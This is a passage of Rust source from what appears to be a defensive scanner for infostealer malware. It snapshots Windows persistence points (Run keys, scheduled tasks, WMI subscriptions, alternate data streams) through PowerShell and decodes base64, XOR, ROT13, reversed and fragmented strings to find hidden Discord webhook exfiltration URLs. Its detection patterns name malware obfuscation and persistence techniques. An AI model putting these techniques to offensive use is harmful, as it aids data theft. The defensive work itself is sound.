            source,
            command,
            &args,
            config,
            stats,
            event_tx,
            findings_writer,
        );
    }
}

fn scan_live_system_snapshots(
    config: &Config,
    stats: &Stats,
    event_tx: &Sender<Event>,
    findings_writer: &Arc<Mutex<BufWriter<File>>>,
) {
    let _ = event_tx.send(Event::Log {
        level: "info".to_string(),
        message: "Scanning process, service, task, startup, WMI, and ADS snapshots.".to_string(),
    });

    for (source, command, args) in [
        (
            "process-commandlines",
            "powershell",
            vec![
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Select-Object ProcessId,ParentProcessId,ExecutablePath,CommandLine | ConvertTo-Csv -NoTypeInformation",
            ],
        ),
        (
            "services",
            "powershell",
            vec![
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Select-Object Name,State,StartMode,StartName,PathName | ConvertTo-Csv -NoTypeInformation",
            ],
        ),
        (
            "scheduled-tasks",
            "powershell",
            vec![
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object { [PSCustomObject]@{ TaskPath=$_.TaskPath; TaskName=$_.TaskName; State=$_.State; Actions=(($_.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join ' | ') } } | ConvertTo-Csv -NoTypeInformation",
            ],
        ),
        (
            "registry-run-keys",
            "powershell",
            vec![
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "$keys='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce','HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce','HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce'; & { foreach($k in $keys){ if(Test-Path $k){ Get-ItemProperty $k | Select-Object *,@{N='RegistryPath';E={$k}} } } } | ConvertTo-Csv -NoTypeInformation",
            ],
        ),
        (
            "startup-folders",
            "powershell",
            vec![
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "$paths=@($env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',$env:ProgramData+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'); Get-ChildItem -LiteralPath $paths -Force -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime | ConvertTo-Csv -NoTypeInformation",
            ],
        ),
        (
            "wmi-persistence",
            "powershell",
            vec![
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -ErrorAction SilentlyContinue | Select-Object Name,Query | ConvertTo-Csv -NoTypeInformation; Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -ErrorAction SilentlyContinue | Select-Object Name,CommandLineTemplate,ExecutablePath | ConvertTo-Csv -NoTypeInformation; Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Select-Object Filter,Consumer | ConvertTo-Csv -NoTypeInformation",
            ],
        ),
        (
            "ads-high-risk",
            "powershell",
            vec![
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "$roots=@($env:TEMP,$env:APPDATA,$env:LOCALAPPDATA,$env:PUBLIC) | Where-Object { $_ -and (Test-Path $_) }; Get-ChildItem -LiteralPath $roots -Force -Recurse -Depth 4 -ErrorAction SilentlyContinue | Get-Item -Stream * -ErrorAction SilentlyContinue | Where-Object { $_.Stream -ne ':$DATA' } | Select-Object FileName,Stream,Length | Select-Object -First 500 | ConvertTo-Csv -NoTypeInformation",
            ],
        ),
    ] {
        scan_command_snapshot(
            source,
            command,
            &args,
            config,
            stats,
            event_tx,
            findings_writer,
        );
    }
}

fn scan_command_snapshot(
    source: &str,
    command: &str,
    args: &[&str],
    config: &Config,
    stats: &Stats,
    event_tx: &Sender<Event>,
    findings_writer: &Arc<Mutex<BufWriter<File>>>,
) {
    let Some(output) = run_command_with_timeout(command, args, RUNTIME_COMMAND_TIMEOUT) else {
        let _ = event_tx.send(Event::Log {
            level: "warn".to_string(),
            message: format!("Runtime snapshot {source} timed out and was skipped."),
        });
        return;
    };

    let mut bytes = output.stdout;
    bytes.extend_from_slice(&output.stderr);
    if bytes.is_empty() {
        return;
    }

    stats.bytes.fetch_add(bytes.len() as u64, Ordering::Relaxed);
    let location = format!("{source}://snapshot");
    let mut candidates = Vec::new();
    scan_small_content(Path::new(source), &bytes, &mut candidates);
    let threat = threat_output(
        location.clone(),
        source,
        assess_infostealer_bytes(Path::new(source), &bytes, source),
    );

    if !candidates.is_empty() {
        dedupe_candidates(&mut candidates);
        write_candidates_for_location(
            &location,
            source,
            candidates,
            threat.as_ref(),
            stats,
            event_tx,
            findings_writer,
            config.reveal_secrets,
            config.emit_secrets_to_ui,
        );
    }
}

fn run_command_with_timeout(command: &str, args: &[&str], timeout: Duration) -> Option<Output> {
    let mut child = Command::new(command)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .ok()?;
    let started = Instant::now();

    loop {
        if child.try_wait().ok()?.is_some() {
            return child.wait_with_output().ok();
        }

        if started.elapsed() >= timeout {
            let _ = child.kill();
            return child.wait_with_output().ok();
        }

        thread::sleep(Duration::from_millis(40));
    }
}

fn merge_threat(target: &mut ThreatAssessment, source: ThreatAssessment) {
    target.categories |= source.categories;
    for reason in source.reasons {
        add_threat(target, 0, &reason, 0);
    }
    target.score = target.score.saturating_add(source.score);
}

fn scan_file(
    job: &FileJob,
    config: &Config,
) -> Result<(u64, Vec<Candidate>, bool, Option<ThreatOutput>)> {
    let path = &job.path;
    if is_output_file(path, &config.output) {
        return Ok((0, Vec::new(), true, None));
    }

    let len = job.len;
    if let Some(max) = config.max_file_bytes {
        if len > max {
            return Ok((0, Vec::new(), true, None));
        }
    }

    let mut candidates = Vec::new();
    let mut threat = ThreatAssessment::default();
    if len <= DEEP_DECODE_LIMIT {
        let mut file = open_scan_file(path).with_context(|| "open file")?;
        let mut bytes = Vec::with_capacity(len.min(DEEP_DECODE_LIMIT) as usize);
        file.read_to_end(&mut bytes).with_context(|| "read file")?;
        scan_small_content(path, &bytes, &mut candidates);
        threat = assess_infostealer_bytes(path, &bytes, "file");
        scan_container_content(path, &bytes, &mut candidates, &mut threat);
    } else {
        scan_large_file(path, &mut candidates, &mut threat)?;
    }

    dedupe_candidates(&mut candidates);
    let threat = if candidates.is_empty() {
        None
    } else {
        threat_output(path.display().to_string(), "file", threat)
    };
    Ok((len, candidates, false, threat))
}

fn scan_small_content(path: &Path, bytes: &[u8], candidates: &mut Vec<Candidate>) {
    let signals = detect_signals(bytes);
    let deep_text_path = is_deep_text_path(path);

    if signals.text {
        scan_bytes_raw(bytes, "raw-bytes", candidates);
    }

    scan_xor_bytes(bytes, "xor", candidates);

    if bytes.len() < 4 {
        return;
    }

    let likely_text = deep_text_path || signals.text || signals.encoded;
    if likely_text && sample_printable_ratio(bytes, 65536) > 0.18 {
        let text = String::from_utf8_lossy(bytes);
        scan_text_deep(&text, "text", signals.encoded || deep_text_path, candidates);
    }

    if signals.utf16 {
        scan_utf16(bytes, "utf16le", true, candidates);
        scan_utf16(bytes, "utf16le+1", true, candidates);
        scan_utf16(bytes, "utf16be", false, candidates);
        scan_utf16(bytes, "utf16be+1", false, candidates);
    }
}

fn scan_large_file(
    path: &Path,
    candidates: &mut Vec<Candidate>,
    threat: &mut ThreatAssessment,
) -> Result<()> {
    let mut file = open_scan_file(path).with_context(|| "open large file")?;
    let mut buffer = vec![0u8; STREAM_CHUNK_SIZE];
    let mut carry = Vec::<u8>::new();
    let deep_text_path = is_deep_text_path(path);
    let mut chunk_index = 0usize;

    loop {
        let read = file
            .read(&mut buffer)
            .with_context(|| "read large file chunk")?;
        if read == 0 {
            break;
        }

        let mut window = Vec::with_capacity(carry.len() + read);
        window.extend_from_slice(&carry);
        window.extend_from_slice(&buffer[..read]);

        let signals = detect_signals(&window);
        score_bytes(&window, threat);
        score_compiled_binary_window(path, &window, threat);
        if signals.text {
            scan_bytes_raw(&window, "raw-bytes-window", candidates);
        }
        scan_xor_bytes(&window, "xor-window", candidates);

        if (signals.text || signals.encoded || deep_text_path)
            && sample_printable_ratio(&window, 65536) > 0.22
        {
            let text = String::from_utf8_lossy(&window);
            scan_text_patterns(&text, "text-window", candidates);
            score_threat_text(&text, threat);
            if signals.text || deep_text_path {
                let normalized = normalize_obfuscation(&decode_common_escapes(&text));
                if normalized != text {
                    scan_text_patterns(&normalized, "normalized-window", candidates);
                    score_threat_text(&normalized, threat);
                }
                if signals.encoded || deep_text_path {
                    scan_encoded_blobs(&normalized, "normalized-window", candidates);
                    score_encoded_blobs(&normalized, threat);
                }
            }
        }

        if chunk_index == 0 {
            scan_container_content(path, &window, candidates, threat);
        }
        chunk_index = chunk_index.saturating_add(1);

        let keep = window.len().min(STREAM_OVERLAP);
        carry.clear();
        carry.extend_from_slice(&window[window.len() - keep..]);
    }

    Ok(())
}

fn scan_container_content(
    path: &Path,
    bytes: &[u8],
    candidates: &mut Vec<Candidate>,
    threat: &mut ThreatAssessment,
) {
    scan_compressed_content(path, bytes, candidates, threat);

    if !is_zip_like(path, bytes) {
        return;
    }

    let cursor = Cursor::new(bytes);
    let Ok(mut archive) = ZipArchive::new(cursor) else {
        return;
    };

    let mut total_read = 0usize;
    let entry_count = archive.len().min(ARCHIVE_ENTRY_LIMIT);
    for index in 0..entry_count {
        let Ok(mut entry) = archive.by_index(index) else {
            continue;
        };
        if entry.is_dir() {
            continue;
        }
        if entry.encrypted() {
            add_threat(threat, 6, "Encrypted archive content", CAT_OBFUSCATION);
            continue;
        }

        let entry_len = entry.size() as usize;
        if entry_len == 0 || entry_len > ARCHIVE_ENTRY_SCAN_LIMIT {
            continue;
        }
        if total_read.saturating_add(entry_len) > ARCHIVE_TOTAL_SCAN_LIMIT {
            break;
        }

        let mut entry_bytes = Vec::with_capacity(entry_len);
        if entry.read_to_end(&mut entry_bytes).is_err() {
            continue;
        }
        total_read = total_read.saturating_add(entry_bytes.len());

        let entry_name = entry.name().replace('\\', "/");
        let entry_path = Path::new(&entry_name);
        let mut entry_candidates = Vec::new();
        scan_small_content(entry_path, &entry_bytes, &mut entry_candidates);
        for mut candidate in entry_candidates {
            candidate.method = format!(
                "archive:{}:{}",
                trim_location(&entry_name),
                candidate.method
            );
            candidates.push(candidate);
        }

        let entry_threat = assess_infostealer_bytes(entry_path, &entry_bytes, "archive");
        merge_threat(threat, entry_threat);
        scan_compressed_content(entry_path, &entry_bytes, candidates, threat);
    }
}

fn scan_compressed_content(
    path: &Path,
    bytes: &[u8],
    candidates: &mut Vec<Candidate>,
    threat: &mut ThreatAssessment,
) {
    for (label, decoded) in decompress_candidates(bytes) {
        let mut decoded_candidates = Vec::new();
        scan_small_content(path, &decoded, &mut decoded_candidates);
        for mut candidate in decoded_candidates {
            candidate.method = format!("{label}:{}", candidate.method);
            candidates.push(candidate);
        }

        let decoded_threat = assess_infostealer_bytes(path, &decoded, "decompressed");
        merge_threat(threat, decoded_threat);
    }
}

fn decompress_candidates(bytes: &[u8]) -> Vec<(&'static str, Vec<u8>)> {
    let mut out = Vec::new();
    if bytes.len() < 4 {
        return out;
    }

    if bytes.starts_with(&[0x1f, 0x8b]) {
        if let Some(decoded) = decompress_gzip(bytes) {
            out.push(("gzip", decoded));
        }
    }

    if matches!(
        bytes.get(0..2),
        Some([0x78, 0x01] | [0x78, 0x5e] | [0x78, 0x9c] | [0x78, 0xda])
    ) {
        if let Some(decoded) = decompress_zlib(bytes) {
            out.push(("zlib", decoded));
        }
    }

    for index in find_embedded_gzip_offsets(bytes).into_iter().take(16) {
        if let Some(decoded) = decompress_gzip(&bytes[index..]) {
            out.push(("embedded-gzip", decoded));
        }
    }

    for index in find_embedded_zlib_offsets(bytes).into_iter().take(16) {
        if let Some(decoded) = decompress_zlib(&bytes[index..]) {
            out.push(("embedded-zlib", decoded));
        }
    }

    out
}

fn find_embedded_gzip_offsets(bytes: &[u8]) -> Vec<usize> {
    bytes
        .windows(2)
        .enumerate()
        .filter_map(|(index, window)| (index > 0 && window == [0x1f, 0x8b]).then_some(index))
        .collect()
}

fn find_embedded_zlib_offsets(bytes: &[u8]) -> Vec<usize> {
    bytes
        .windows(2)
        .enumerate()
        .filter_map(|(index, window)| {
            (index > 0
                && matches!(
                    window,
                    [0x78, 0x01] | [0x78, 0x5e] | [0x78, 0x9c] | [0x78, 0xda]
                ))
            .then_some(index)
        })
        .collect()
}

fn decompress_gzip(bytes: &[u8]) -> Option<Vec<u8>> {
    let mut decoder = GzDecoder::new(Cursor::new(bytes));
    read_limited(&mut decoder, DECOMPRESS_SCAN_LIMIT)
}

fn decompress_zlib(bytes: &[u8]) -> Option<Vec<u8>> {
    let mut decoder = ZlibDecoder::new(Cursor::new(bytes));
    read_limited(&mut decoder, DECOMPRESS_SCAN_LIMIT)
}

fn read_limited<R: Read>(reader: &mut R, limit: usize) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    let mut limited = reader.take(limit as u64 + 1);
    limited.read_to_end(&mut out).ok()?;
    if out.len() > limit || out.len() < 16 {
        return None;
    }
    Some(out)
}

fn is_zip_like(path: &Path, bytes: &[u8]) -> bool {
    if !bytes.starts_with(b"PK\x03\x04") && !bytes.starts_with(b"PK\x05\x06") {
        return false;
    }

    let Some(extension) = path.extension().and_then(|value| value.to_str()) else {
        return true;
    };

    matches!(
        extension.to_ascii_lowercase().as_str(),
        "zip"
            | "jar"
            | "war"
            | "ear"
            | "nupkg"
            | "vsix"
            | "docx"
            | "xlsx"
            | "pptx"
            | "apk"
            | "xpi"
            | "crx"
            | "pyz"
    )
}

fn trim_location(value: &str) -> String {
    const MAX_LOCATION: usize = 140;
    if value.len() <= MAX_LOCATION {
        value.to_string()
    } else {
        format!("...{}", &value[value.len() - MAX_LOCATION..])
    }
}

#[cfg(windows)]
fn open_scan_file(path: &Path) -> io::Result<File> {
    OpenOptions::new()
        .read(true)
        .share_mode(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE)
        .custom_flags(FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN)
        .open(path)
}

#[cfg(not(windows))]
fn open_scan_file(path: &Path) -> io::Result<File> {
    File::open(path)
}

fn detect_signals(bytes: &[u8]) -> ScanSignals {
    ScanSignals {
        text: TEXT_SIGNAL_AC.is_match(bytes),
        encoded: ENCODED_SIGNAL_AC.is_match(bytes),
        utf16: UTF16_SIGNAL_AC.is_match(bytes),
    }
}

fn is_deep_text_path(path: &Path) -> bool {
    if let Some(name) = path.file_name().and_then(|value| value.to_str()) {
        if matches!(
            name.to_ascii_lowercase().as_str(),
            "dockerfile"
                | ".env"
                | ".env.local"
                | ".env.development"
                | ".env.production"
                | ".npmrc"
                | ".yarnrc"
                | ".pnpmrc"
                | "requirements.txt"
                | "package.json"
                | "package-lock.json"
                | "yarn.lock"
                | "pnpm-lock.yaml"
                | "cargo.toml"
                | "cargo.lock"
        ) {
            return true;
        }
    }

    let Some(extension) = path.extension().and_then(|value| value.to_str()) else {
        return false;
    };

    matches!(
        extension.to_ascii_lowercase().as_str(),
        "txt"
            | "log"
            | "json"
            | "jsonc"
            | "js"
            | "jsx"
            | "ts"
            | "tsx"
            | "mjs"
            | "cjs"
            | "py"
            | "ps1"
            | "psm1"
            | "bat"
            | "cmd"
            | "vbs"
            | "vbe"
            | "wsf"
            | "hta"
            | "cs"
            | "cpp"
            | "c"
            | "h"
            | "hpp"
            | "rs"
            | "go"
            | "java"
            | "kt"
            | "php"
            | "rb"
            | "lua"
            | "pl"
            | "sh"
            | "bash"
            | "zsh"
            | "fish"
            | "xml"
            | "html"
            | "htm"
            | "css"
            | "scss"
            | "sass"
            | "less"
            | "yaml"
            | "yml"
            | "toml"
            | "ini"
            | "cfg"
            | "conf"
            | "config"
            | "env"
            | "properties"
            | "lock"
            | "npmrc"
            | "yarnrc"
            | "dockerfile"
            | "compose"
            | "sql"
            | "md"
            | "markdown"
    )
}

fn to_utf16_bytes(value: &str, little_endian: bool) -> Vec<u8> {
    value
        .encode_utf16()
        .flat_map(|unit| {
            if little_endian {
                unit.to_le_bytes()
            } else {
                unit.to_be_bytes()
            }
        })
        .collect()
}

fn scan_bytes_raw(bytes: &[u8], method: &str, candidates: &mut Vec<Candidate>) {
    for found in WEBHOOK_BYTES_RE.find_iter(bytes) {
        if let Ok(value) = std::str::from_utf8(found.as_bytes()) {
            candidates.push(Candidate {
                value: value.to_string(),
                method: method.to_string(),
                confidence: "High",
            });
        }
    }
}

fn scan_xor_bytes(bytes: &[u8], method: &str, candidates: &mut Vec<Candidate>) {
    if bytes.len() < 32 {
        return;
    }

    let (automaton, keys) = &*XOR_MARKER_AC;
    let mut seen_keys = HashSet::new();
    for found in automaton.find_iter(bytes).take(16) {
        let key = keys[found.pattern().as_usize()];
        if seen_keys.insert(key) {
            let start = found.start().saturating_sub(XOR_DECODE_RADIUS);
            let end = (found.end() + XOR_DECODE_RADIUS).min(bytes.len());
            let decoded = bytes[start..end]
                .iter()
                .map(|byte| byte ^ key)
                .collect::<Vec<u8>>();
            let decoded_text = String::from_utf8_lossy(&decoded);
            if has_webhook_signal(&decoded_text) {
                scan_text_patterns(&decoded_text, &format!("{method}:0x{key:02X}"), candidates);
                let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
                scan_text_patterns(
                    &normalized,
                    &format!("{method}:0x{key:02X}:normalized"),
                    candidates,
                );
            }
        }
    }
}

fn scan_utf16(bytes: &[u8], method: &str, little_endian: bool, candidates: &mut Vec<Candidate>) {
    if bytes.len() < 8 {
        return;
    }

    let offset = usize::from(method.ends_with("+1"));
    if bytes.len().saturating_sub(offset) < 8 {
        return;
    }
    let usable_len = bytes.len().saturating_sub(offset) & !1;

    let units: Vec<u16> = bytes[offset..offset + usable_len]
        .chunks_exact(2)
        .map(|chunk| {
            if little_endian {
                u16::from_le_bytes([chunk[0], chunk[1]])
            } else {
                u16::from_be_bytes([chunk[0], chunk[1]])
            }
        })
        .collect();

    let sample_len = units.len().min(4096);
    let printable = units
        .iter()
        .take(sample_len)
        .filter(|unit| {
            let value = **unit;
            value == 9 || value == 10 || value == 13 || (0x20..=0x7e).contains(&value)
        })
        .count();

    if sample_len == 0 || (printable as f64 / sample_len as f64) < 0.20 {
        return;
    }

    let text = String::from_utf16_lossy(&units);
    scan_text_deep(
        &text,
        method,
        ENCODED_SIGNAL_AC.is_match(text.as_bytes()),
        candidates,
    );
}

fn scan_text_deep(text: &str, method: &str, scan_encoded: bool, candidates: &mut Vec<Candidate>) {
    scan_text_patterns(text, method, candidates);

    let decoded = decode_common_escapes(text);
    if decoded != text {
        scan_text_patterns(&decoded, &format!("{method}:escapes"), candidates);
    }

    for joined in collect_string_fragment_runs(&decoded) {
        scan_text_patterns(&joined, &format!("{method}:string-fragments"), candidates);
        let normalized_joined = normalize_obfuscation(&joined);
        if normalized_joined != joined && !has_full_webhook(&joined) {
            scan_text_patterns(
                &normalized_joined,
                &format!("{method}:string-fragments:normalized"),
                candidates,
            );
        }
        if scan_encoded || ENCODED_SIGNAL_AC.is_match(joined.as_bytes()) {
            scan_encoded_blobs(&joined, &format!("{method}:string-fragments"), candidates);
        }
        scan_numeric_byte_arrays(&joined, &format!("{method}:string-fragments"), candidates);
    }

    let normalized = normalize_obfuscation(&decoded);
    if normalized != decoded {
        scan_text_patterns(&normalized, &format!("{method}:normalized"), candidates);
        if scan_encoded && ENCODED_SIGNAL_AC.is_match(normalized.as_bytes()) {
            scan_encoded_blobs(&normalized, &format!("{method}:normalized"), candidates);
        }
    }

    let aggressive = normalize_aggressive_obfuscation(&decoded);
    if aggressive != normalized
        && has_webhook_signal(&decoded)
        && !has_full_webhook(&decoded)
        && !has_full_webhook(&normalized)
    {
        scan_text_patterns(&aggressive, &format!("{method}:aggressive"), candidates);
    }

    scan_numeric_byte_arrays(&decoded, method, candidates);

    let lower = decoded.to_ascii_lowercase();
    if lower.contains("skoohbew") || lower.contains("drocsid") {
        let reversed: String = decoded.chars().rev().collect();
        scan_text_patterns(&reversed, &format!("{method}:reversed"), candidates);
    }

    if contains_any(&lower, &["qvfpbeq", "jroubbxf", "uggc", "uggcf"]) {
        let rot13 = rot13_text(&decoded);
        scan_text_patterns(&rot13, &format!("{method}:rot13"), candidates);
        let normalized_rot13 = normalize_obfuscation(&decode_common_escapes(&rot13));
        if normalized_rot13 != rot13 {
            scan_text_patterns(
                &normalized_rot13,
                &format!("{method}:rot13:normalized"),
                candidates,
            );
        }
    }

    if scan_encoded && ENCODED_SIGNAL_AC.is_match(decoded.as_bytes()) {
        scan_encoded_blobs(&decoded, method, candidates);
    }
}

fn scan_text_patterns(text: &str, method: &str, candidates: &mut Vec<Candidate>) {
    let mut full_hits = 0usize;
    for found in WEBHOOK_TEXT_RE.find_iter(text) {
        full_hits += 1;
        candidates.push(Candidate {
            value: found.as_str().to_string(),
            method: method.to_string(),
            confidence: "High",
        });
    }

    if full_hits == 0 {
        for found in PARTIAL_TEXT_RE.find_iter(text) {
            candidates.push(Candidate {
                value: found.as_str().to_string(),
                method: format!("{method}:partial"),
                confidence: "Medium",
            });
        }
    }
}

fn scan_encoded_blobs(text: &str, method: &str, candidates: &mut Vec<Candidate>) {
    scan_encoded_blobs_depth(text, method, candidates, 0);
}

fn scan_encoded_blobs_depth(
    text: &str,
    method: &str,
    candidates: &mut Vec<Candidate>,
    depth: usize,
) {
    if depth > 2 {
        return;
    }

    for found in BASE64_RE.find_iter(text).take(512) {
        let raw = found.as_str();
        if let Some(decoded) = decode_base64_candidate(raw) {
            if decoded.len() > DEEP_DECODE_LIMIT as usize {
                continue;
            }
            let decoded_text = String::from_utf8_lossy(&decoded);
            if has_webhook_signal(&decoded_text) {
                scan_text_patterns(&decoded_text, &format!("{method}:base64"), candidates);
                if !has_full_webhook(&decoded_text) {
                    let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
                    scan_text_patterns(
                        &normalized,
                        &format!("{method}:base64:normalized"),
                        candidates,
                    );
                }
            }
            if depth < 2 && ENCODED_SIGNAL_AC.is_match(decoded_text.as_bytes()) {
                scan_encoded_blobs_depth(
                    &decoded_text,
                    &format!("{method}:base64:nested"),
                    candidates,
                    depth + 1,
                );
            }
        }
    }

    for found in BASE32_RE.find_iter(text).take(256) {
        let raw = found.as_str();
        if let Some(decoded) = decode_base32_candidate(raw) {
            if decoded.len() > DEEP_DECODE_LIMIT as usize {
                continue;
            }
            let decoded_text = String::from_utf8_lossy(&decoded);
            if has_webhook_signal(&decoded_text) {
                scan_text_patterns(&decoded_text, &format!("{method}:base32"), candidates);
                if !has_full_webhook(&decoded_text) {
                    let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
                    scan_text_patterns(
                        &normalized,
                        &format!("{method}:base32:normalized"),
                        candidates,
                    );
                }
            }
            if depth < 2 && ENCODED_SIGNAL_AC.is_match(decoded_text.as_bytes()) {
                scan_encoded_blobs_depth(
                    &decoded_text,
                    &format!("{method}:base32:nested"),
                    candidates,
                    depth + 1,
                );
            }
        }
    }

    for found in HEX_RE.find_iter(text).take(256) {
        if let Some(decoded) = decode_hex_candidate(found.as_str()) {
            let decoded_text = String::from_utf8_lossy(&decoded);
            if has_webhook_signal(&decoded_text) {
                scan_text_patterns(&decoded_text, &format!("{method}:hex"), candidates);
                if !has_full_webhook(&decoded_text) {
                    let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
                    scan_text_patterns(
                        &normalized,
                        &format!("{method}:hex:normalized"),
                        candidates,
                    );
                }
            }
            if depth < 2 && ENCODED_SIGNAL_AC.is_match(decoded_text.as_bytes()) {
                scan_encoded_blobs_depth(
                    &decoded_text,
                    &format!("{method}:hex:nested"),
                    candidates,
                    depth + 1,
                );
            }
        }
    }
}

fn scan_numeric_byte_arrays(text: &str, method: &str, candidates: &mut Vec<Candidate>) {
    for found in NUMERIC_BYTE_ARRAY_RE.find_iter(text).take(96) {
        let Some(decoded) = decode_numeric_byte_array(found.as_str()) else {
            continue;
        };
        let decoded_text = String::from_utf8_lossy(&decoded);
        if has_webhook_signal(&decoded_text) {
            scan_text_patterns(&decoded_text, &format!("{method}:byte-array"), candidates);
            if !has_full_webhook(&decoded_text) {
                let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
                scan_text_patterns(
                    &normalized,
                    &format!("{method}:byte-array:normalized"),
                    candidates,
                );
            }
        }
    }
}

fn decode_numeric_byte_array(raw: &str) -> Option<Vec<u8>> {
    if raw.len() > 131_072 {
        return None;
    }

    let mut out = Vec::new();
    for part in raw.split(',') {
        let value = part.trim();
        let parsed = if let Some(hex) = value
            .strip_prefix("0x")
            .or_else(|| value.strip_prefix("0X"))
        {
            u16::from_str_radix(hex, 16).ok()?
        } else {
            value.parse::<u16>().ok()?
        };

        if parsed > 255 {
            return None;
        }
        out.push(parsed as u8);
    }

    if out.len() >= 16 && printable_ratio(&out) > 0.30 {
        Some(out)
    } else {
        None
    }
}

fn decode_base64_candidate(raw: &str) -> Option<Vec<u8>> {
    let mut candidate = raw.trim().to_string();
    let remainder = candidate.len() % 4;
    if remainder != 0 {
        candidate.extend(std::iter::repeat('=').take(4 - remainder));
    }

    general_purpose::STANDARD
        .decode(candidate.as_bytes())
        .or_else(|_| general_purpose::URL_SAFE.decode(candidate.as_bytes()))
        .ok()
        .filter(|bytes| bytes.len() >= 16 && printable_ratio(bytes) > 0.30)
}

fn decode_base32_candidate(raw: &str) -> Option<Vec<u8>> {
    let mut buffer = 0u32;
    let mut bits = 0u8;
    let mut out = Vec::new();

    for byte in raw.trim_end_matches('=').bytes() {
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a',
            b'2'..=b'7' => byte - b'2' + 26,
            _ => return None,
        } as u32;

        buffer = (buffer << 5) | value;
        bits += 5;
        while bits >= 8 {
            bits -= 8;
            out.push(((buffer >> bits) & 0xff) as u8);
        }
    }

    if out.len() >= 16 && printable_ratio(&out) > 0.30 {
        Some(out)
    } else {
        None
    }
}

fn decode_hex_candidate(raw: &str) -> Option<Vec<u8>> {
    if raw.len() % 2 != 0 {
        return None;
    }

    let mut out = Vec::with_capacity(raw.len() / 2);
    for index in (0..raw.len()).step_by(2) {
        let byte = u8::from_str_radix(&raw[index..index + 2], 16).ok()?;
        out.push(byte);
    }

    if out.len() >= 16 && printable_ratio(&out) > 0.30 {
        Some(out)
    } else {
        None
    }
}

fn collect_string_fragment_runs(text: &str) -> Vec<String> {
    if !text.contains('"') && !text.contains('\'') && !text.contains('`') {
        return Vec::new();
    }

    let mut literals = Vec::<(usize, usize, String)>::new();
    let mut indices = text.char_indices().peekable();
    while let Some((start, character)) = indices.next() {
        if !matches!(character, '"' | '\'' | '`') {
            continue;
        }

        let quote = character;
        let mut fragment = String::new();
        let mut escaped = false;
        let mut end = start + character.len_utf8();

        for (index, next) in indices.by_ref() {
            if escaped {
                fragment.push('\\');
                fragment.push(next);
                escaped = false;
                end = index + next.len_utf8();
                continue;
            }

            if next == '\\' {
                escaped = true;
                end = index + next.len_utf8();
                continue;
            }

            if next == quote {
                end = index + next.len_utf8();
                break;
            }

            fragment.push(next);
            end = index + next.len_utf8();
        }

        if !fragment.is_empty() && fragment.len() <= 4096 {
            literals.push((start, end, decode_common_escapes(&fragment)));
        }
    }

    let mut runs = Vec::new();
    let mut current = String::new();
    let mut count = 0usize;
    let mut last_end = 0usize;

    for (start, end, fragment) in literals {
        if count > 0 {
            let gap = &text[last_end..start];
            if !is_string_concat_gap(gap) {
                push_string_fragment_run(&mut runs, &current, count);
                current.clear();
                count = 0;
            }
        }

        current.push_str(&fragment);
        count = count.saturating_add(1);
        last_end = end;
        if current.len() > 131_072 {
            current.clear();
            count = 0;
        }
    }

    push_string_fragment_run(&mut runs, &current, count);
    runs
}

fn is_string_concat_gap(gap: &str) -> bool {
    if gap.trim().is_empty() {
        return !gap.contains('\n') && !gap.contains('\r');
    }

    gap.chars().all(|character| {
        character.is_whitespace()
            || matches!(
                character,
                '+' | '.' | '&' | ',' | '(' | ')' | '[' | ']' | '{' | '}' | ';'
            )
    })
}

fn push_string_fragment_run(runs: &mut Vec<String>, value: &str, count: usize) {
    if count >= 2 && (has_webhook_signal(value) || ENCODED_SIGNAL_AC.is_match(value.as_bytes())) {
        runs.push(value.to_string());
    }
}

fn decode_common_escapes(text: &str) -> String {
    let mut out = text.replace("\\/", "/");
    out = HEX_BYTE_ESCAPE_RE
        .replace_all(&out, |captures: &regex::Captures| {
            decode_u32(&captures[1], 16)
        })
        .into_owned();
    out = UNICODE_BRACE_ESCAPE_RE
        .replace_all(&out, |captures: &regex::Captures| {
            decode_u32(&captures[1], 16)
        })
        .into_owned();
    out = UNICODE_ESCAPE_RE
        .replace_all(&out, |captures: &regex::Captures| {
            decode_u32(&captures[1], 16)
        })
        .into_owned();
    out = URL_ESCAPE_RE
        .replace_all(&out, |captures: &regex::Captures| {
            decode_u32(&captures[1], 16)
        })
        .into_owned();
    out = HTML_HEX_ESCAPE_RE
        .replace_all(&out, |captures: &regex::Captures| {
            decode_u32(&captures[1], 16)
        })
        .into_owned();
    HTML_DEC_ESCAPE_RE
        .replace_all(&out, |captures: &regex::Captures| {
            decode_u32(&captures[1], 10)
        })
